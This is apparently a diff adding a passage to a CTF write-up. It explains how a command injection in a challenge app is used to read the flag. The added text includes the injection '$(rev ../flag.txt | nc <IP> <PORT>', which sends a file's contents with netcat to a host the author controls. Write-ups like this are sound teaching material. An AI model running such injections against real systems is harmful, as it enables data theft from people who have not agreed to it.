@@ -19,6 +19,17 @@ During the CTF I managed to figure out the vulnerable part of the application, b
 
 ![1](https://user-images.githubusercontent.com/52963102/129076307-6eab48f9-d55d-40a2-a940-fdb651f35ca6.PNG)
 
+Honestly I'm not 100% sure why the program actually executes the input code, because it's only supposed to draw it on the image, but an example of printing is here:
+
+![1](https://user-images.githubusercontent.com/52963102/129077222-d454259f-fa0e-4cde-b32d-89bf44fb55c6.PNG)
+
+(_test.py_ and _test2.py_ used for testing can be found in the repo)
+
+Now the flag itself is in _../flag.txt_ and because of the _noleek.png_ being a thing, we can't just cat the flag out. A clever solution that I found was using netcat on your device with portforwarding and then using this as the injection:
+
+<code>$(rev ../flag.txt | nc <IP> <PORT></code>
+	
+
 
 ## Fancy Button Generator
 
